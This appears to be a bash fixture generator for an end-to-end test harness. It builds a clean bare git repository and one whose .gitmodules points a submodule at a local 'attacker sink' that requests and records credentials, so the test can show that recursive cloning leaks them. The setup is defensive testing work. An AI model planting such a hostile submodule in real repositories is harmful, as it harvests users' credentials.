#!/usr/bin/env bash
# Fixture git repositories for the E2E harness. Generated, never committed
# (see .gitignore). Bare repos served by the git-http container over smart-HTTP
# and by the sshd container over git-over-ssh.
#
#   clean.git      one commit, one file. The happy-path clone target.
#   submodule.git  carries a hostile .gitmodules pointing at the live attacker
#                  sink. The Harpoc arm denies --recurse-submodules before any
#                  spawn, so that URL is never contacted; the BASELINE arm of
#                  the same paired row does recurse, and the sink recording the
#                  credential is what makes "the status quo leaks" an
#                  observation rather than an assertion.
set -euo pipefail

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$DIR/out"

# Bump whenever the CONTENT of a generated repo changes. Without it the
# all-artifact sentinel below reads a stale set as complete and the fixture
# silently keeps whatever an earlier revision produced — the drift class the
# Phase 3 pki generator was already bitten by (R-4).
VERSION="3-real-gitlink-submodule"

# The sentinel checks the LAST artifact of each repo (info/refs is written by
# the final update-server-info step), not just clean.git's existence: a run
# killed mid-generation must not read as complete. A partial or outdated set is
# wiped and regenerated.
complete=1
for p in clean.git/info/refs submodule.git/info/refs; do
  [ -f "$OUT/$p" ] || complete=0
done
if [ "$complete" = 1 ] && [ "$(cat "$OUT/.fixture-version" 2>/dev/null || true)" != "$VERSION" ]; then
  echo "repos: artifact set predates fixture version $VERSION — regenerating" >&2
  complete=0
fi
if [ "$complete" = 1 ]; then
  echo "repos: already generated at $OUT"
  exit 0
fi
if [ -d "$OUT" ] && [ -n "$(ls -A "$OUT" 2>/dev/null)" ]; then
  echo "repos: incomplete or outdated artifact set at $OUT — regenerating" >&2
  rm -rf "$OUT"
fi

mkdir -p "$OUT"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

# Deterministic identity so a regenerate is byte-stable modulo commit time.
export GIT_AUTHOR_NAME="Harpoc E2E" GIT_AUTHOR_EMAIL="e2e@harpoc.test"
export GIT_COMMITTER_NAME="Harpoc E2E" GIT_COMMITTER_EMAIL="e2e@harpoc.test"

git init -q -b main "$WORK/clean"
echo "harpoc e2e clean repo" >"$WORK/clean/README.md"
git -C "$WORK/clean" add -A
git -C "$WORK/clean" commit -q -m "initial"
git clone -q --bare "$WORK/clean" "$OUT/clean.git"
git -C "$OUT/clean.git" update-server-info

git init -q -b main "$WORK/sub"
echo "harpoc e2e submodule repo" >"$WORK/sub/README.md"
# A tab-indented .gitmodules, git's own format. The URL is off-box and LIVE: the
# attacker sink's /challenge path, which asks for credentials, so a recursing
# client hands them over and the sink records it.
printf '[submodule "evil"]\n\tpath = evil\n\turl = https://localhost:55444/challenge/evil.git\n' \
  >"$WORK/sub/.gitmodules"
git -C "$WORK/sub" add -A
# A REAL gitlink, added by hand because `git submodule add` would have to clone
# the attacker URL at generation time. Without it .gitmodules is declarative
# only: `clone --recurse-submodules` finds nothing registered in the tree, exits
# 0 and fetches nothing — enough for the Harpoc arm, which refuses before any
# spawn, but the baseline half of the paired row would then silently perform no
# recursion and read as "the status quo did not leak".
git -C "$WORK/sub" update-index --add \
  --cacheinfo "160000,$(git -C "$WORK/clean" rev-parse HEAD),evil"
git -C "$WORK/sub" commit -q -m "initial with hostile submodule"
git clone -q --bare "$WORK/sub" "$OUT/submodule.git"
git -C "$OUT/submodule.git" update-server-info

printf '%s\n' "$VERSION" >"$OUT/.fixture-version"

echo "repos: generated bare git repositories in $OUT"
